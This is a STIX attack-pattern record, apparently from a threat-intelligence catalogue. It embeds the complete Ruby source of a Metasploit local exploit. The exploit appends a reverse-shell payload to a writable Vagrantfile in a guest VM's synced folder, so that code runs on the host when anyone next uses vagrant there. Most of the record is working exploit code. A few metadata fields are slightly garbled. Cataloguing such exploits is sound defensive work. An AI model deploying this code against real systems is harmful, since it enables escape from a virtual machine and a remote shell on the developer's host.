{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f9071ac6-d510-4ab4-8165-60be80af1821",
    "created": "2024-08-14T17:07:13.933385Z",
    "modified": "2024-08-14T17:07:13.93339Z",
    "name": "Vagrant Synced Folder Vagrantfile Breakout",
    "description": " This module exploits a default Vagrant synced folder (shared folder) to append a Ruby payload to the Vagrant project Vagrantfile config file.  By default, unless a Vagrant project explicitly disables shared folders Vagrant mounts the project directory on the host as a writable 'vagrant' directory on the guest virtual machine. This directory includes the project Vagrantfile configuration file.  Ruby code within the Vagrantfile is loaded and executed when a user runs any vagrant command from the project directory on the host leading to execution of Ruby code on the host.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/local/vagrant_synced_folder_vagrantfile_breakout.rb",
            "external_id": "vagrant_synced_folder_vagrantfile_breakout.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.vagrantup.com/docs/synced-folders"
        },
        {
            "source_name": "reference",
            "url": "https://www.virtualbox.org/manual/ch04.html#sharedfolders"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Vagrant Synced Folder Vagrantfile Breakout',\n        'Description' => %q{\n          This module exploits a default Vagrant synced folder (shared folder)\n          to append a Ruby payload to the Vagrant project Vagrantfile config file.\n\n          By default, unless a Vagrant project explicitly disables shared folders,\n          Vagrant mounts the project directory on the host as a writable 'vagrant'\n          directory on the guest virtual machine. This directory includes the\n          project Vagrantfile configuration file.\n\n          Ruby code within the Vagrantfile is loaded and executed when a user\n          runs any vagrant command from the project directory on the host,\n          leading to execution of Ruby code on the host.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'HashiCorp', # Vagrant defaults\n          'bcoles' # Metasploit\n        ],\n        'DisclosureDate' => '2011-01-19', # Vagrant 0.7.0 release date - first mention of shared folders in CHANGELOG\n        'Platform' => %w[ruby],\n        'Arch' => ARCH_ALL,\n        'SessionTypes' => [ 'shell', 'powershell', 'meterpreter' ],\n        'Stance' => Msf::Exploit::Stance::Passive,\n        'DefaultOptions' => {\n          'DisablePayloadHandler' => true\n        },\n        'Targets' => [\n          [\n            'Ruby Code',\n            {\n              'Platform' => 'ruby',\n              'Arch' => ARCH_RUBY,\n              'Type' => :ruby,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'ruby/shell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'Payload' => { 'BadChars' => '`' },\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'References' => [\n          ['URL', 'https://www.vagrantup.com/docs/synced-folders'],\n          ['URL', 'https://www.virtualbox.org/manual/ch04.html#sharedfolders']\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, CONFIG_CHANGES ]\n        }\n      )\n    )\n    register_options([\n      OptString.new('VAGRANTFILE_PATH', [false, 'Path to Vagrantfile (leave blank to auto detect)', ''])\n    ])\n  end\n\n  # Search potential default shared directories for Vagrantfile configuration file\n  def find_vagrantfile_path\n    unless datastore['VAGRANTFILE_PATH'].blank?\n      return exists?(datastore['VAGRANTFILE_PATH']) ? datastore['VAGRANTFILE_PATH'] : nil\n    end\n\n    # Default Vagrant synced folders (aka shared folders)\n    default_shared_directories = [\n      'C:\\\\vagrant\\\\',\n      '/vagrant/'\n    ]\n\n    default_shared_directories.each do |dir_path|\n      begin\n        vagrant_shared_dir_contents = dir(dir_path)\n      rescue Rex::Post::Meterpreter::RequestError\n        next\n      end\n\n      next if vagrant_shared_dir_contents.empty?\n\n      # Vagrant project configuration file name is case-insensitive (typically \"Vagrantfile\")\n      vagrant_shared_dir_contents.each do |fname|\n        return \"#{dir_path}#{fname}\" if fname.downcase == 'vagrantfile'\n      end\n    end\n\n    nil\n  end\n\n  def vagrantfile\n    @vagrantfile ||= find_vagrantfile_path\n  end\n\n  def check\n    return CheckCode::Safe('Vagrantfile not found.') unless vagrantfile\n\n    # `writable?' method does not support Windows systems\n    begin\n      return CheckCode::Detected(\"#{vagrantfile} is not writable.\") unless writable?(vagrantfile)\n    rescue RuntimeError\n      return CheckCode::Detected(\"Could not verify if #{vagrantfile} is writable.\")\n    end\n\n    CheckCode::Appears(\"#{vagrantfile} is writable!\")\n  end\n\n  def exploit\n    fail_with(Failure::NotVulnerable, 'Could not find Vagrantfile') unless vagrantfile\n\n    case target['Type']\n    when :ruby\n      data = payload.encoded\n    when :unix_cmd\n      data = \"`#{payload.encoded}`\"\n    else\n      fail_with(Failure::NoTarget, 'No target selected')\n    end\n\n    print_status(\"Appending payload (#{data.length} bytes) to #{vagrantfile} ...\")\n\n    unless append_file(vagrantfile, \"\\n#{data}\\n\")\n      fail_with(Failure::Unknown, \"Could not write to #{vagrantfile}\")\n    end\n\n    print_status(\"Payload appended to #{vagrantfile}\")\n    print_status('The payload will be executed when a user runs any vagrant command from within the project directory on the host system.')\n    print_warning(\"This module requires manual removal of the payload from the project Vagrantfile: #{vagrantfile}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-01-19, # Vagrant 0.7.0 release date - first mention of shared folders in CHANGELOG",
    "x_mitre_platforms": [
        "unix'"
    ]
}